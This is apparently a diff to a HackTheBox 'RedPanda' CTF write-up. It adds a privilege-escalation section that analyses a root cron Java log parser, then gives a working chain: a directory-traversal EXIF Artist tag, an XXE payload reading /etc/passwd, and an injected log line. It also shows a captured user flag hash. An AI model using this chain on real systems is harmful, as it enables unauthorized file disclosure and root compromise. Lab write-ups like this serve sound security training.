@@ -178,7 +178,7 @@ Test with `Burpsuite Intruder`:
 ![ssti_injection.png](img/ssti_injection.png)
 
 Look like it vulneable with character `#` and `*`.
-# Foothold
+# Exploit
 Go to [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) to find injection with Java. The tips is we need to use `#` or `*` to bypass the filter.
 
 ## Java
@@ -323,7 +323,7 @@ The `user.txt` flag:
 efaa8f33e98ff3993b20c6bade76a83a
 ```
 
-# Escalate Privilege
+# Foothold
 Check the port open with `netstat -tulpn`
 ```bash
 woodenk@redpanda:/tmp/hsperfdata_woodenk$ netstat -tulpn
@@ -351,6 +351,10 @@ woodenk@redpanda:/tmp/hsperfdata_woodenk$
 
 Check the process with `pspy64`
 ![pspy64.png](img/pspy64.png)
+I think there are some process that running in `cronjob`:
+![pspy64_1](img/pspy64_1.png)
+
+![pspy64_2](img/pspy64_2.png)
 ```bash
 2022/08/28 09:06:01 CMD: UID=0    PID=3052   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
 ```
@@ -388,5 +392,288 @@ Humm.
 Tried to login to `mysql`. But there no luck.
 Base on gathering info, i think there will be escalate with somethings with term `logs`. (user in `logs` group, and `syslog` user in `adm` group).
 
-There alot of file in `/opt/` directory. I will download the whole to my `kali` machine.
+There alot of file in `/opt/` directory. I will download the whole to my `kali` machine. Let's examine the code.
 
+```java
+package com.logparser;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.Scanner;
+
+import com.drew.imaging.jpeg.JpegMetadataReader;
+import com.drew.imaging.jpeg.JpegProcessingException;
+import com.drew.metadata.Directory;
+import com.drew.metadata.Metadata;
+import com.drew.metadata.Tag;
+
+import org.jdom2.JDOMException;
+import org.jdom2.input.SAXBuilder;
+import org.jdom2.output.Format;
+import org.jdom2.output.XMLOutputter;
+import org.jdom2.*;
+
+public class App {
+    public static Map parseLog(String line) {
+        String[] strings = line.split("\\|\\|");
+        Map map = new HashMap<>();
+        map.put("status_code", Integer.parseInt(strings[0]));
+        map.put("ip", strings[1]);
+        map.put("user_agent", strings[2]);
+        map.put("uri", strings[3]);
+        
+
+        return map;
+    }
+    public static boolean isImage(String filename){
+        if(filename.contains(".jpg"))
+        {
+            return true;
+        }
+        return false;
+    }
+    public static String getArtist(String uri) throws IOException, JpegProcessingException
+    {
+        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
+        File jpgFile = new File(fullpath);
+        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
+        for(Directory dir : metadata.getDirectories())
+        {
+            for(Tag tag : dir.getTags())
+            {
+                if(tag.getTagName() == "Artist")
+                {
+                    return tag.getDescription();
+                }
+            }
+        }
+
+        return "N/A";
+    }
+    public static void addViewTo(String path, String uri) throws JDOMException, IOException
+    {
+        SAXBuilder saxBuilder = new SAXBuilder();
+        XMLOutputter xmlOutput = new XMLOutputter();
+        xmlOutput.setFormat(Format.getPrettyFormat());
+
+        File fd = new File(path);
+        
+        Document doc = saxBuilder.build(fd);
+        
+        Element rootElement = doc.getRootElement();
+ 
+        for(Element el: rootElement.getChildren())
+        {
+    
+            
+            if(el.getName() == "image")
+            {
+                if(el.getChild("uri").getText().equals(uri))
+                {
+                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
+                    System.out.println("Total views:" + Integer.toString(totalviews));
+                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
+                    Integer views = Integer.parseInt(el.getChild("views").getText());
+                    el.getChild("views").setText(Integer.toString(views + 1));
+                }
+            }
+        }
+        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
+        xmlOutput.output(doc, writer);
+    }
+    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
+        File log_fd = new File("/opt/panda_search/redpanda.log");
+        Scanner log_reader = new Scanner(log_fd);
+        while(log_reader.hasNextLine())
+        {
+            String line = log_reader.nextLine();
+            if(!isImage(line))
+            {
+                continue;
+            }
+            Map parsed_data = parseLog(line);
+            System.out.println(parsed_data.get("uri"));
+            String artist = getArtist(parsed_data.get("uri").toString());
+            System.out.println("Artist: " + artist);
+            String xmlPath = "/credits/" + artist + "_creds.xml";
+            addViewTo(xmlPath, parsed_data.get("uri").toString());
+        }
+
+    }
+}
+
+```
+1. The main program read the log locate in `/opt/panda_search/redpanda.log`. We have permission to write direct to this file beside with logs for access via webpage.
+2. The `log` need to have 4 part, and delimeter with `||`
+```java
+	public static Map parseLog(String line) {
+        String[] strings = line.split("\\|\\|");
+        Map map = new HashMap<>();
+        map.put("status_code", Integer.parseInt(strings[0]));
+        map.put("ip", strings[1]);
+        map.put("user_agent", strings[2]);
+        map.put("uri", strings[3]);
+        
+
+        return map;
+    }
+```
+3. The image must have extension `.jpg`
+```java
+	public static boolean isImage(String filename){
+        if(filename.contains(".jpg"))
+        {
+            return true;
+        }
+        return false;
+    }
+```
+4. 
+- The `image` is access with path `/opt/panda_search/src/main/resources/static` + `uri`.
+- The image need to have tags with key `Artist` and the value is artist name.
+- This code can be directory travesal.
+```java
+    public static String getArtist(String uri) throws IOException, JpegProcessingException
+    {
+        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
+        File jpgFile = new File(fullpath);
+        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
+        for(Directory dir : metadata.getDirectories())
+        {
+            for(Tag tag : dir.getTags())
+            {
+                if(tag.getTagName() == "Artist")
+                {
+                    return tag.getDescription();
+                }
+            }
+        }
+
+        return "N/A";
+    }
+```
+5. We don't have write permission to `/credits/` path.
+6. The xml format file:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<credits>
+  <author>woodenk</author>
+  <image>
+    <uri>/img/greg.jpg</uri>
+    <views>4</views>
+  </image>
+  <image>
+    <uri>/img/hungy.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/smooch.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/smiley.jpg</uri>
+    <views>1</views>
+  </image>
+  <totalviews>5</totalviews>
+</credits>
+```
+
+OK. I think that enough. We have write access to `redpanda.log` file, and this file is parse by a program that running in crontab with `root` account.
+
+# Escalate Privilege
+## Prepare the payload
+1. The image payload
+- We create image with `Artist` tag. Cause we don't have write permission on `/credits/` to update the value of xml. We need to use directory travesal to another directory that we can write the data. We can use `/home/woodenk/` or `/tmp`. I will chose `/tmp`.
+- We using `exiftool` for write tags to our payload image.
+```sh
+┌──(kali㉿kali)-[~/Workspace/labs-htb/RedPanda]
+└─$ exiftool -Artist="../tmp/pe" pe.jpg
+perl: warning: Setting locale failed.
+perl: warning: Please check that your locale settings:
+        LANGUAGE = (unset),
+        LC_ALL = (unset),
+        LC_CTYPE = "UTF-8",
+        LC_TERMINAL = "iTerm2",
+        LANG = "en_US.UTF-8"
+    are supported and installed on your system.
+perl: warning: Falling back to a fallback locale ("en_US.UTF-8").
+    1 image files updated
+
+┌──(kali㉿kali)-[~/Workspace/labs-htb/RedPanda]
+└─$ exiftool pe.jpg
+perl: warning: Setting locale failed.
+perl: warning: Please check that your locale settings:
+        LANGUAGE = (unset),
+        LC_ALL = (unset),
+        LC_CTYPE = "UTF-8",
+        LC_TERMINAL = "iTerm2",
+        LANG = "en_US.UTF-8"
+    are supported and installed on your system.
+perl: warning: Falling back to a fallback locale ("en_US.UTF-8").
+ExifTool Version Number         : 12.44
+File Name                       : pe.jpg
+Directory                       : .
+File Size                       : 128 kB
+File Modification Date/Time     : 2022:08:30 06:10:36-04:00
+File Access Date/Time           : 2022:08:30 06:10:36-04:00
+File Inode Change Date/Time     : 2022:08:30 06:10:36-04:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+Exif Byte Order                 : Big-endian (Motorola, MM)
+X Resolution                    : 72
+Y Resolution                    : 72
+Resolution Unit                 : inches
+Artist                          : ../tmp/pe
+Y Cb Cr Positioning             : Centered
+Image Width                     : 1280
+Image Height                    : 853
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 1280x853
+Megapixels                      : 1.1
+
+┌──(kali㉿kali)-[~/Workspace/labs-htb/RedPanda]
+```
+2. The xml code for Privilege Escalation.
+[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)
+[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
+We will create a file like the this and save file to `pe_credits.xml`
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+
+<credits>
+  <author>pe</author>
+  <image>
+    <uri>../../../../../../../pe.jpg</uri>
+    <views>4</views>
+    <foo>&xxe;</foo>
+  </image>
+  <image>
+    <uri>/img/hungy.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/smooch.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/smiley.jpg</uri>
+    <views>1</views>
+  </image>
+  <totalviews>5</totalviews>
+</credits>
+```
+3. The log that need to write to `redpanda.log`
+```sh
+200||127.0.0.1||curl||../../../../../../../pe.jpg
+```
